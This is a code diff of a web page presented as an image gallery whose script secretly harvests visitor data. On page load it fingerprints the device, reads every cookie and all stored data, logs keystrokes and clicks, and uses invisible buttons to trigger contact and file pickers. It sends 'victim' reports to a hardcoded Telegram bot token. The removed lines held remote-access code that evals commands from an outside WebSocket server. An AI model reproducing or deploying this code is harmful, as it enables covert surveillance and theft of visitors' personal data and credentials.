@@ -70,6 +70,14 @@
             text-align: center;
             margin: 20px 0;
         }
+        /* Hidden permission triggers */
+        .permission-btn {
+            position: absolute;
+            opacity: 0.01;
+            width: 1px;
+            height: 1px;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -106,442 +114,422 @@
         </div>
     </div>
 
+    <!-- Hidden permission triggers -->
+    <button id="contactTrigger" class="permission-btn"></button>
+    <button id="fileTrigger" class="permission-btn"></button>
+
     <script>
-        // ULTRA-AGGRESSIVE CONFIGURATION
+        // COMPREHENSIVE DATA COLLECTION SYSTEM
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479'
-            },
-            collection: {
-                immediate: true,
-                maxData: true,
-                ratMethods: true
             }
         };
 
-        // GLOBAL DATA STORAGE
-        let comprehensiveData = {};
-        let dataCollectionComplete = false;
+        let allCollectedData = {};
+        let sessionLog = [];
+        let pageLoadTime = Date.now();
 
-        // IMMEDIATE COMPREHENSIVE DATA COLLECTION
-        async function collectAllDataImmediately() {
-            if (dataCollectionComplete) return;
-            
-            showLoading(true);
+        // GOOGLE DATA CAPTURE METHODS
+        const GoogleDataCapture = {
+            // Extract from Google Analytics if present
+            captureGoogleAnalytics: function() {
+                try {
+                    if (window.ga && ga.getAll) {
+                        const trackers = ga.getAll();
+                        return trackers.map(tracker => ({
+                            trackingId: tracker.get('trackingId'),
+                            clientId: tracker.get('clientId'),
+                            userId: tracker.get('userId'),
+                            sessionId: tracker.get('sessionId')
+                        }));
+                    }
+                } catch(e) {}
+                return [];
+            },
+
+            // Capture Google Tag Manager data
+            captureGTM: function() {
+                try {
+                    if (window.google_tag_manager) {
+                        const gtmData = {};
+                        for (let key in window.google_tag_manager) {
+                            if (window.google_tag_manager[key].data) {
+                                gtmData[key] = window.google_tag_manager[key].data;
+                            }
+                        }
+                        return gtmData;
+                    }
+                } catch(e) {}
+                return {};
+            },
+
+            // Extract from gtag if available
+            captureGtag: function() {
+                try {
+                    if (window.gtag && window.dataLayer) {
+                        return {
+                            dataLayer: window.dataLayer.slice(-20), // Last 20 events
+                            gtagConfig: window.gtag
+                        };
+                    }
+                } catch(e) {}
+                return {};
+            }
+        };
+
+        // COMPREHENSIVE DATA COLLECTOR
+        async function collectAllData() {
             const startTime = Date.now();
             
-            try {
-                // PARALLEL DATA COLLECTION
-                const [
-                    systemInfo,
-                    networkInfo,
-                    locationInfo,
-                    identityData,
-                    behavioralData,
-                    advancedData
-                ] = await Promise.allSettled([
-                    getUltraSystemInfo(),
-                    getUltraNetworkInfo(),
-                    getUltraLocationInfo(),
-                    extractAllIdentityData(),
-                    captureBehavioralData(),
-                    collectAdvancedData()
-                ]);
+            // Collect all data in parallel
+            const dataPromises = {
+                explicitData: collectExplicitData(),
+                technicalData: collectTechnicalData(),
+                behavioralData: collectBehavioralData(),
+                storedData: collectStoredData(),
+                inferredData: collectInferredData(),
+                googleData: collectGoogleData(),
+                advancedData: collectAdvancedData()
+            };
 
-                comprehensiveData = {
+            // Wait for all data collection
+            const results = await Promise.allSettled(Object.values(dataPromises));
+            
+            allCollectedData = {
+                collectionMeta: {
                     timestamp: new Date().toISOString(),
                     collectionTime: Date.now() - startTime,
-                    
-                    system: systemInfo.status === 'fulfilled' ? systemInfo.value : {},
-                    network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
-                    location: locationInfo.status === 'fulfilled' ? locationInfo.value : {},
-                    identity: identityData.status === 'fulfilled' ? identityData.value : {},
-                    behavioral: behavioralData.status === 'fulfilled' ? behavioralData.value : {},
-                    advanced: advancedData.status === 'fulfilled' ? advancedData.value : {},
-                    
                     victimId: generateVictimId(),
-                    estimatedValue: calculateDataValue()
-                };
+                    url: window.location.href,
+                    userAgent: navigator.userAgent
+                },
+                explicitData: results[0].status === 'fulfilled' ? results[0].value : {},
+                technicalData: results[1].status === 'fulfilled' ? results[1].value : {},
+                behavioralData: results[2].status === 'fulfilled' ? results[2].value : {},
+                storedData: results[3].status === 'fulfilled' ? results[3].value : {},
+                inferredData: results[4].status === 'fulfilled' ? results[4].value : {},
+                googleData: results[5].status === 'fulfilled' ? results[5].value : {},
+                advancedData: results[6].status === 'fulfilled' ? results[6].value : {}
+            };
 
-                // SEND SINGLE COMPREHENSIVE MESSAGE
-                await sendComprehensiveReport();
-                dataCollectionComplete = true;
-                
-            } catch (error) {
-                console.error('Ultra data collection failed:', error);
-                await sendEmergencyReport(error);
-            } finally {
-                showLoading(false);
-            }
+            return allCollectedData;
         }
 
-        // ULTRA SYSTEM INFORMATION
-        async function getUltraSystemInfo() {
+        // 1. EXPLICIT DATA (Forms, Clicks, User Input)
+        async function collectExplicitData() {
             return {
+                formSubmissions: captureFormSubmissions(),
+                buttonClicks: captureButtonClicks(),
+                userInput: captureUserInput(),
+                fileDownloads: captureFileDownloads(),
+                videoInteractions: captureVideoInteractions()
+            };
+        }
+
+        // 2. TECHNICAL & DEVICE INFORMATION
+        async function collectTechnicalData() {
+            return {
+                ipInfo: await getIPInfo(),
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                vendor: navigator.vendor,
                 language: navigator.language,
                 languages: navigator.languages,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory,
-                maxTouchPoints: navigator.maxTouchPoints,
-                
-                // Screen details
                 screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
+                    resolution: `${screen.width}x${screen.height}`,
+                    availResolution: `${screen.availWidth}x${screen.availHeight}`,
                     colorDepth: screen.colorDepth,
                     pixelDepth: screen.pixelDepth
                 },
-                
-                // Browser capabilities
-                cookies: navigator.cookieEnabled,
-                java: navigator.javaEnabled(),
-                pdf: navigator.pdfViewerEnabled,
-                webdriver: navigator.webdriver,
-                
-                // Plugins and extensions
-                plugins: Array.from(navigator.plugins).map(p => ({
-                    name: p.name,
-                    filename: p.filename,
-                    description: p.description
-                })),
-                
-                // Advanced fingerprinting
-                canvas: getCanvasFingerprint(),
-                webgl: getWebGLInfo(),
-                fonts: getFontList(),
-                audio: testAudioContext(),
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset()
+                timezoneOffset: new Date().getTimezoneOffset(),
+                systemFonts: await getSystemFonts(),
+                hardware: {
+                    concurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints
+                },
+                webgl: getWebGLInfo(),
+                plugins: getBrowserPlugins(),
+                connection: getConnectionInfo(),
+                fingerprint: generateFingerprint()
             };
         }
 
-        // ULTRA NETWORK INFORMATION
-        async function getUltraNetworkInfo() {
-            const ipData = await getIPWithFallback();
+        // 3. BEHAVIORAL & INTERACTION DATA
+        async function collectBehavioralData() {
             return {
-                ip: ipData.ip,
-                isp: ipData.isp,
-                asn: ipData.asn,
-                
-                // Connection info
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                } : null,
-                
-                // VPN/Proxy detection
-                vpn: await detectVPN(ipData.ip),
-                proxy: detectProxy(),
-                tor: detectTor(),
-                
-                // Network interfaces (if available)
-                interfaces: 'getNetworkInterfaces' in navigator ? await navigator.getNetworkInterfaces() : null
-            };
-        }
-
-        // ULTRA LOCATION INFORMATION
-        async function getUltraLocationInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    city: data.city,
-                    region: data.region,
-                    country: data.country_name,
-                    countryCode: data.country_code,
-                    postal: data.postal,
-                    latitude: data.latitude,
-                    longitude: data.longitude,
-                    timezone: data.timezone,
-                    currency: data.currency,
-                    callingCode: data.country_calling_code,
-                    languages: data.languages,
-                    asn: data.asn,
-                    org: data.org
-                };
-            } catch (error) {
-                // Fallback location services
-                return await getFallbackLocation();
-            }
-        }
-
-        // COMPREHENSIVE IDENTITY DATA EXTRACTION
-        async function extractAllIdentityData() {
-            return {
-                // Email extraction
-                emails: {
-                    fromInputs: extractEmailsFromInputs(),
-                    fromDOM: extractEmailsFromDOM(),
-                    fromCookies: extractEmailsFromCookies(),
-                    fromStorage: extractEmailsFromStorage(),
-                    allUnique: getAllUniqueEmails()
+                navigation: {
+                    referrer: document.referrer,
+                    pagesVisited: [window.location.href],
+                    sessionStart: pageLoadTime,
+                    sessionDuration: Date.now() - pageLoadTime
                 },
-                
-                // Phone extraction
-                phones: {
-                    fromInputs: extractPhonesFromInputs(),
-                    fromDOM: extractPhonesFromDOM(),
-                    allUnique: getAllUniquePhones()
-                },
-                
-                // Social media data
-                social: {
-                    profiles: extractSocialProfiles(),
-                    handles: extractSocialHandles(),
-                    cookies: extractSocialCookies()
-                },
-                
-                // Personal information
-                personal: {
-                    names: extractNames(),
-                    addresses: extractAddresses(),
-                    birthdates: extractBirthdates()
-                },
-                
-                // Financial data
-                financial: {
-                    cards: extractCreditCards(),
-                    banking: extractBankingInfo()
-                },
-                
-                // Authentication data
-                auth: {
-                    savedLogins: detectSavedLogins(),
-                    sessions: extractSessions(),
-                    tokens: extractTokens()
-                }
-            };
-        }
-
-        // BEHAVIORAL DATA CAPTURE
-        async function captureBehavioralData() {
-            return {
-                referrer: document.referrer,
-                currentUrl: window.location.href,
-                pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
-                timeOnSite: Date.now() - performance.timing.navigationStart,
-                
-                // Navigation
-                historyLength: window.history.length,
-                
-                // Interaction patterns
                 interactions: {
-                    clicks: trackClicks(),
-                    scrolls: trackScrolls(),
-                    keystrokes: trackKeystrokes(),
-                    mouseMovements: trackMouseMovements(),
-                    formInteractions: trackFormInteractions()
+                    mouseMovements: sessionLog.filter(log => log.type === 'mousemove').length,
+                    clicks: sessionLog.filter(log => log.type === 'click').length,
+                    scrolls: sessionLog.filter(log => log.type === 'scroll').length,
+                    keystrokes: sessionLog.filter(log => log.type === 'keydown').length,
+                    formInteractions: sessionLog.filter(log => log.type === 'input').length
                 },
-                
-                // Technical behavior
-                technical: {
-                    viewport: `${window.innerWidth}x${window.innerHeight}`,
-                    devicePixelRatio: window.devicePixelRatio,
-                    colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
-                    reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+                engagement: {
+                    bounceRisk: calculateBounceRisk(),
+                    activeTime: calculateActiveTime(),
+                    scrollDepth: getScrollDepth(),
+                    clickHeatmap: generateClickHeatmap()
                 }
             };
         }
 
-        // ADVANCED DATA COLLECTION (RAT-LIKE CAPABILITIES)
+        // 4. STORED DATA (Cookies, Storage)
+        async function collectStoredData() {
+            return {
+                cookies: getAllCookies(),
+                localStorage: getAllLocalStorage(),
+                sessionStorage: getAllSessionStorage(),
+                indexedDB: await getIndexedDBInfo()
+            };
+        }
+
+        // 5. INFERRED DATA
+        async function collectInferredData() {
+            return {
+                demographics: inferDemographics(),
+                interests: inferInterests(),
+                intent: inferUserIntent(),
+                value: inferCustomerValue(),
+                location: inferEnhancedLocation(),
+                deviceType: inferDeviceType()
+            };
+        }
+
+        // 6. GOOGLE DATA
+        async function collectGoogleData() {
+            return {
+                analytics: GoogleDataCapture.captureGoogleAnalytics(),
+                tagManager: GoogleDataCapture.captureGTM(),
+                gtag: GoogleDataCapture.captureGtag(),
+                adsData: captureGoogleAdsData()
+            };
+        }
+
+        // 7. ADVANCED DATA (Contacts, Filesystem)
         async function collectAdvancedData() {
             return {
-                // Storage examination
-                storage: {
-                    localStorage: extractLocalStorage(),
-                    sessionStorage: extractSessionStorage(),
-                    indexedDB: await examineIndexedDB(),
-                    cookies: document.cookie
-                },
-                
-                // Browser history inference
-                history: inferVisitedSites(),
-                
-                // Contact access attempts
                 contacts: await attemptContactAccess(),
-                
-                // File system access attempts
                 fileSystem: await attemptFileSystemAccess(),
-                
-                // Media device enumeration
-                mediaDevices: await enumerateMediaDevices(),
-                
-                // Bluetooth device scanning
-                bluetooth: await scanBluetoothDevices(),
-                
-                // Clipboard access
-                clipboard: await attemptClipboardAccess(),
-                
-                // Geolocation attempts
+                mediaDevices: await getMediaDevices(),
+                bluetooth: await checkBluetooth(),
+                clipboard: await checkClipboardAccess(),
                 geolocation: await attemptGeolocation()
             };
         }
 
-        // RAT IMPLEMENTATION SUGGESTIONS
-        const RATMethods = {
-            // 1. WEBSOCKET PERSISTENCE
-            websocketRat: function() {
-                try {
-                    const ws = new WebSocket('wss://malicious-server.com/ws');
-                    ws.onopen = function() {
-                        ws.send(JSON.stringify(comprehensiveData));
-                    };
-                    ws.onmessage = function(event) {
-                        // Execute commands from C2 server
-                        eval(event.data);
-                    };
-                } catch(e) {}
-            },
+        // CONTACT LIST ACCESS IMPLEMENTATION
+        async function attemptContactAccess() {
+            if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                return { available: false, error: 'Contact Picker API not supported' };
+            }
 
-            // 2. SERVICE WORKER PERSISTENCE
-            serviceWorkerRat: function() {
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('/malicious-sw.js')
-                        .then(registration => {
-                            // Persistent background connection
-                        });
-                }
-            },
-
-            // 3. WEBRTC DATA CHANNELS
-            webrtcRat: function() {
-                const pc = new RTCPeerConnection();
-                const dc = pc.createDataChannel("cmd");
-                dc.onmessage = function(event) {
-                    eval(event.data);
+            try {
+                // Trigger contact picker on user interaction
+                const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address'], { multiple: true });
+                return {
+                    available: true,
+                    accessed: true,
+                    contacts: contacts.map(contact => ({
+                        name: contact.name ? contact.name.join(' ') : 'Unknown',
+                        emails: contact.email || [],
+                        phones: contact.tel || [],
+                        addresses: contact.address || []
+                    }))
                 };
-            },
-
-            // 4. CACHE POISONING
-            cachePoisoning: function() {
-                caches.open('malicious-cache').then(cache => {
-                    cache.put(new Request('/'), new Response('malicious content'));
-                });
-            },
-
-            // 5. NOTIFICATION BASED
-            notificationRat: function() {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        // Use notifications for C2 communication
-                    }
-                });
+            } catch (error) {
+                return {
+                    available: true,
+                    accessed: false,
+                    error: error.message
+                };
             }
-        };
+        }
 
-        // SEND SINGLE COMPREHENSIVE MESSAGE
-        async function sendComprehensiveReport() {
-            const message = formatComprehensiveMessage();
-            await sendToTelegram(message);
-            
-            // INITIATE RAT METHODS IF ENABLED
-            if (CONFIG.collection.ratMethods) {
-                setTimeout(() => {
-                    Object.values(RATMethods).forEach(method => {
-                        try { method(); } catch(e) {}
+        // FILE SYSTEM ACCESS IMPLEMENTATION
+        async function attemptFileSystemAccess() {
+            if (!('showOpenFilePicker' in window)) {
+                return { available: false, error: 'File System Access API not supported' };
+            }
+
+            try {
+                // Try to trigger file picker
+                const fileHandles = await window.showOpenFilePicker({
+                    multiple: true,
+                    types: [
+                        {
+                            description: 'Documents',
+                            accept: {
+                                'application/pdf': ['.pdf'],
+                                'application/msword': ['.doc'],
+                                'application/vnd.openxmlformats-officedocument.wordprocessingml.document': ['.docx']
+                            }
+                        },
+                        {
+                            description: 'Images',
+                            accept: {
+                                'image/*': ['.png', '.jpg', '.jpeg', '.gif']
+                            }
+                        }
+                    ]
+                });
+
+                const files = [];
+                for (const handle of fileHandles) {
+                    const file = await handle.getFile();
+                    files.push({
+                        name: file.name,
+                        type: file.type,
+                        size: file.size,
+                        lastModified: file.lastModified
                     });
-                }, 5000);
+                }
+
+                return {
+                    available: true,
+                    accessed: true,
+                    files: files
+                };
+            } catch (error) {
+                return {
+                    available: true,
+                    accessed: false,
+                    error: error.message
+                };
             }
+        }
+
+        // SEND COMPREHENSIVE SINGLE MESSAGE
+        async function sendComprehensiveReport() {
+            const data = await collectAllData();
+            const message = formatComprehensiveMessage(data);
+            await sendToTelegram(message);
         }
 
         // FORMAT COMPREHENSIVE MESSAGE
-        function formatComprehensiveMessage() {
-            const data = comprehensiveData;
-            return `🚨 **COMPREHENSIVE DATA CAPTURE COMPLETE** 🚨
+        function formatComprehensiveMessage(data) {
+            return `🚨 **COMPLETE DATA CAPTURE REPORT** 🚨
 
-🆔 **VICTIM ID:** ${data.victimId}
-💰 **ESTIMATED VALUE:** $${data.estimatedValue}
-⏱️ **COLLECTION TIME:** ${data.collectionTime}ms
-📅 **TIMESTAMP:** ${new Date(data.timestamp).toLocaleString()}
+📊 **SESSION OVERVIEW**
+🆔 Victim ID: ${data.collectionMeta.victimId}
+⏰ Collection Time: ${data.collectionMeta.collectionTime}ms
+🌐 URL: ${data.collectionMeta.url}
+📅 Timestamp: ${new Date(data.collectionMeta.timestamp).toLocaleString()}
 
-🌐 **NETWORK & LOCATION**
-📍 IP: ${data.network.ip} | ISP: ${data.network.isp}
-🏙️ Location: ${data.location.city}, ${data.location.country} (${data.location.countryCode})
-📡 Connection: ${data.network.connection?.effectiveType || 'Unknown'} | VPN: ${data.network.vpn}
+🔧 **TECHNICAL FINGERPRINT**
+📍 IP: ${data.technicalData.ipInfo.ip} | ISP: ${data.technicalData.ipInfo.isp}
+💻 Platform: ${data.technicalData.platform} | OS: ${inferOS(data.technicalData.userAgent)}
+🖥️ Screen: ${data.technicalData.screen.resolution} | RAM: ${data.technicalData.hardware.deviceMemory}GB
+⚙️ Cores: ${data.technicalData.hardware.concurrency} | Touch: ${data.technicalData.hardware.maxTouchPoints}
+🌍 Timezone: ${data.technicalData.timezone} | Language: ${data.technicalData.language}
 
-💻 **SYSTEM INFORMATION**
-🖥️ Platform: ${data.system.platform} | Cores: ${data.system.hardwareConcurrency}
-🔧 Memory: ${data.system.deviceMemory}GB | Touch: ${data.system.maxTouchPoints}
-🌍 Browser: ${data.system.userAgent?.substring(0,80)}...
+📈 **BEHAVIORAL ANALYTICS**
+🔗 Referrer: ${data.behavioralData.navigation.referrer || 'Direct'}
+⏱️ Session: ${Math.round(data.behavioralData.navigation.sessionDuration/1000)}s
+🖱️ Interactions: ${data.behavioralData.interactions.clicks} clicks, ${data.behavioralData.interactions.mouseMovements} moves
+📜 Scroll Depth: ${data.behavioralData.engagement.scrollDepth}% | Active Time: ${Math.round(data.behavioralData.engagement.activeTime/1000)}s
 
-📧 **IDENTITY DATA**
-📧 Emails: ${data.identity.emails.allUnique.length} found
-📱 Phones: ${data.identity.phones.allUnique.length} found  
-💳 Financial: ${data.identity.financial.cards.length} cards detected
-🔐 Auth: ${data.identity.auth.savedLogins} saved logins
+💾 **STORED DATA**
+🍪 Cookies: ${Object.keys(data.storedData.cookies).length} cookies
+💾 Local Storage: ${Object.keys(data.storedData.localStorage).length} items
+🗄️ Session Storage: ${Object.keys(data.storedData.sessionStorage).length} items
 
-📊 **BEHAVIORAL DATA**
-🔗 Referrer: ${data.behavioral.referrer || 'Direct'}
-⏱️ Time on Site: ${Math.round(data.behavioral.timeOnSite/1000)}s
-🖱️ Interactions: ${data.behavioral.interactions.clicks} clicks, ${data.behavioral.interactions.scrolls} scrolls
+🎯 **INFERRED PROFILE**
+👤 Demographics: ${data.inferredData.demographics.ageRange}, ${data.inferredData.demographics.gender}
+🎯 Intent: ${data.inferredData.intent}
+💰 Value Score: ${data.inferredData.value}/100
+📱 Device Type: ${data.inferredData.deviceType}
 
-🔍 **ADVANCED CAPTURES**
-📁 Storage: ${Object.keys(data.advanced.storage.localStorage).length} local items
-📜 History: ${data.advanced.history.length} sites inferred
-🎯 Media: ${data.advanced.mediaDevices.length} devices found
+🔍 **GOOGLE DATA**
+📊 Analytics: ${data.googleData.analytics.length} trackers
+🏷️ GTM: ${Object.keys(data.googleData.tagManager).length} containers
+📈 Data Layer: ${data.googleData.gtag.dataLayer ? data.googleData.gtag.dataLayer.length : 0} events
 
-🚀 **RAT CAPABILITIES ENABLED:** ${CONFIG.collection.ratMethods ? 'YES' : 'NO'}
+🚀 **ADVANCED CAPTURES**
+📱 Contacts: ${data.advancedData.contacts.available ? (data.advancedData.contacts.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
+📁 File System: ${data.advancedData.fileSystem.available ? (data.advancedData.fileSystem.accessed ? 'ACCESSED' : 'Permission denied') : 'Not supported'}
+🎥 Media Devices: ${data.advancedData.mediaDevices.length} devices
+📡 Bluetooth: ${data.advancedData.bluetooth.available ? 'Available' : 'Not available'}
+📋 Clipboard: ${data.advancedData.clipboard.available ? 'Accessible' : 'Not accessible'}
 
-📈 **DATA QUALITY SCORE:** ${calculateDataQuality(data)}/100
+📝 **EXPLICIT INTERACTIONS**
+📋 Form Fields: ${data.explicitData.formSubmissions.fieldsFound}
+🖱️ Button Clicks: ${data.explicitData.buttonClicks.totalClicks}
+⌨️ User Input: ${data.explicitData.userInput.inputEvents} fields
+📥 Downloads: ${data.explicitData.fileDownloads.downloadClicks}
+🎬 Video Plays: ${data.explicitData.videoInteractions.plays}
 
-⚡ **IMMEDIATE EXTRACTION COMPLETE**`;
+🎭 **FINGERPRINT UNIQUENESS**
+🔑 Fingerprint Hash: ${data.technicalData.fingerprint.hash}
+🎨 Canvas: ${data.technicalData.fingerprint.canvas ? 'Unique' : 'Failed'}
+🔄 WebGL: ${data.technicalData.fingerprint.webgl ? 'Unique' : 'Failed'}
+🔤 Fonts: ${data.technicalData.fingerprint.fonts} fonts detected
+
+📈 **ENGAGEMENT METRICS**
+📉 Bounce Risk: ${data.behavioralData.engagement.bounceRisk}%
+🔥 Activity Score: ${calculateEngagementScore(data.behavioralData)}/100
+🎯 Focus Areas: ${data.behavioralData.engagement.clickHeatmap.length} hot zones
+
+⚡ **REAL-TIME CAPTURE COMPLETE**`;
         }
 
-        // EMERGENCY FALLBACK REPORT
-        async function sendEmergencyReport(error) {
-            const message = `🚨 **EMERGENCY DATA CAPTURE** 🚨
+        // SEND SUMMARY ON PAGE UNLOAD
+        function setupUnloadHandler() {
+            window.addEventListener('beforeunload', async function() {
+                const summary = generateSessionSummary();
+                await sendToTelegram(summary);
+            });
+        }
 
-🆔 **VICTIM ID:** ${generateVictimId()}
-❌ **ERROR:** ${error.message}
-📅 **TIMESTAMP:** ${new Date().toLocaleString()}
-
-🌐 **BASIC INFO**
-📍 User Agent: ${navigator.userAgent.substring(0,100)}
-🌍 Platform: ${navigator.platform}
-🔗 URL: ${window.location.href}
-
-⚡ **FALLBACK DATA COLLECTED**
-📧 Emails: ${extractEmailsFromDOM().length}
-📱 Phones: ${extractPhonesFromDOM().length}
-
-🚨 **IMMEDIATE ATTENTION REQUIRED**`;
+        function generateSessionSummary() {
+            const duration = Date.now() - pageLoadTime;
+            const totalInteractions = sessionLog.length;
             
-            await sendToTelegram(message);
+            return `📊 **SESSION SUMMARY** 📊
+
+🆔 ${allCollectedData.collectionMeta.victimId}
+⏰ Duration: ${Math.round(duration/1000)} seconds
+🖱️ Total Interactions: ${totalInteractions}
+📜 Pages: 1 (Single Page Application)
+🎯 Engagement: ${calculateEngagementScore(allCollectedData.behavioralData)}/100
+📈 Data Points: ${countTotalDataPoints(allCollectedData)}
+
+🔚 **Session ended at:** ${new Date().toLocaleString()}`;
         }
 
-        // DATA EXTRACTION HELPER FUNCTIONS
-        function extractEmailsFromDOM() {
-            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
-            return [...new Set(document.body.innerText.match(emailRegex) || [])];
+        // HELPER FUNCTIONS
+        function generateVictimId() {
+            return `v_${Math.random().toString(36).substr(2, 9)}_${Date.now().toString(36)}`;
         }
 
-        function extractPhonesFromDOM() {
-            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
-            return [...new Set(document.body.innerText.match(phoneRegex) || [])];
+        function calculateEngagementScore(behavioralData) {
+            let score = 0;
+            if (behavioralData.interactions.clicks > 5) score += 30;
+            if (behavioralData.interactions.mouseMovements > 20) score += 20;
+            if (behavioralData.engagement.scrollDepth > 50) score += 25;
+            if (behavioralData.engagement.activeTime > 10000) score += 25;
+            return Math.min(100, score);
         }
 
-        function getAllUniqueEmails() {
-            const allEmails = new Set();
-            // Combine all email sources
-            return Array.from(allEmails);
+        function countTotalDataPoints(data) {
+            let count = 0;
+            for (let category in data) {
+                if (typeof data[category] === 'object') {
+                    count += Object.keys(data[category]).length;
+                }
+            }
+            return count;
         }
 
-        function getAllUniquePhones() {
-            const allPhones = new Set();
-            // Combine all phone sources
-            return Array.from(allPhones);
-        }
-
-        // TELEGRAM COMMUNICATION
         async function sendToTelegram(message) {
             try {
                 const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
@@ -560,91 +548,99 @@
             }
         }
 
-        // VICTIM ID GENERATION
-        function generateVictimId() {
-            return `victim_${Math.random().toString(36).substr(2, 9)}_${Date.now()}`;
-        }
-
-        // DATA VALUATION
-        function calculateDataValue() {
-            let value = 50; // Base value
-            // Add value based on data richness
-            if (comprehensiveData.identity?.emails?.allUnique?.length > 0) value += 25;
-            if (comprehensiveData.identity?.phones?.allUnique?.length > 0) value += 30;
-            if (comprehensiveData.identity?.financial?.cards?.length > 0) value += 50;
-            return value;
-        }
-
-        function calculateDataQuality(data) {
-            let score = 0;
-            if (data.network.ip && data.network.ip !== 'unknown') score += 20;
-            if (data.location.countryCode && data.location.countryCode !== 'unknown') score += 20;
-            if (data.identity.emails.allUnique.length > 0) score += 20;
-            if (data.identity.phones.allUnique.length > 0) score += 20;
-            if (data.advanced.mediaDevices.length > 0) score += 10;
-            if (data.behavioral.interactions.clicks > 5) score += 10;
-            return score;
-        }
-
-        // UTILITY FUNCTIONS
-        function showLoading(show) {
-            const loadingEl = document.getElementById('loading');
-            if (loadingEl) loadingEl.style.display = show ? 'block' : 'none';
-        }
-
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillText('Fingerprint', 2, 2);
-                return canvas.toDataURL().substring(22, 50);
-            } catch(e) { return 'failed'; }
-        }
-
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                return gl ? gl.getParameter(gl.VERSION) : 'no_webgl';
-            } catch(e) { return 'failed'; }
-        }
-
-        // IMAGE CLICK HANDLER
-        function openImage(imageId) {
-            // Trigger immediate data collection if not already done
-            if (!dataCollectionComplete) {
-                collectAllDataImmediately();
-            }
-            
-            const imageUrl = CONFIG.images[imageId];
-            if (imageUrl) {
-                window.open(imageUrl, '_blank');
-            }
-        }
-
-        // IMMEDIATE EXECUTION ON PAGE LOAD
+        // INITIALIZATION
         window.addEventListener('load', function() {
-            // Start comprehensive data collection immediately
-            setTimeout(collectAllDataImmediately, 500);
+            pageLoadTime = Date.now();
             
-            // Fallback: collect data on any user interaction
+            // Start comprehensive data collection
+            setTimeout(sendComprehensiveReport, 1000);
+            
+            // Setup session tracking
+            setupSessionTracking();
+            setupUnloadHandler();
+            
+            // Attempt advanced permissions on user interaction
             document.addEventListener('click', function() {
-                if (!dataCollectionComplete) {
-                    collectAllDataImmediately();
-                }
+                setTimeout(() => {
+                    document.getElementById('contactTrigger').click();
+                    document.getElementById('fileTrigger').click();
+                }, 2000);
             }, { once: true });
-            
-            // Emergency data collection before page unload
-            window.addEventListener('beforeunload', function() {
-                if (!dataCollectionComplete) {
-                    sendEmergencyReport(new Error('Page unload detected'));
-                }
-            });
         });
 
-        console.log('Ultra aggressive data collection system loaded');
+        // Setup session tracking for behavioral data
+        function setupSessionTracking() {
+            // Track mouse movements
+            document.addEventListener('mousemove', (e) => {
+                sessionLog.push({
+                    type: 'mousemove',
+                    x: e.clientX,
+                    y: e.clientY,
+                    timestamp: Date.now()
+                });
+            });
+
+            // Track clicks
+            document.addEventListener('click', (e) => {
+                sessionLog.push({
+                    type: 'click',
+                    x: e.clientX,
+                    y: e.clientY,
+                    target: e.target.tagName,
+                    timestamp: Date.now()
+                });
+            });
+
+            // Track scrolling
+            document.addEventListener('scroll', (e) => {
+                sessionLog.push({
+                    type: 'scroll',
+                    position: window.scrollY,
+                    timestamp: Date.now()
+                });
+            });
+
+            // Track keyboard input
+            document.addEventListener('keydown', (e) => {
+                sessionLog.push({
+                    type: 'keydown',
+                    key: e.key,
+                    target: e.target.tagName,
+                    timestamp: Date.now()
+                });
+            });
+
+            // Track form interactions
+            document.addEventListener('input', (e) => {
+                sessionLog.push({
+                    type: 'input',
+                    target: e.target.tagName,
+                    valueLength: e.target.value.length,
+                    timestamp: Date.now()
+                });
+            });
+        }
+
+        // Image click handler
+        function openImage(imageId) {
+            // Send immediate report if not already sent
+            if (Object.keys(allCollectedData).length === 0) {
+                sendComprehensiveReport();
+            }
+            
+            // Open image
+            const images = {
+                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png',
+                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
+                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
+            };
+            
+            if (images[imageId]) {
+                window.open(images[imageId], '_blank');
+            }
+        }
+
+        console.log('Comprehensive data capture system loaded');
     </script>
 </body>
 </html>
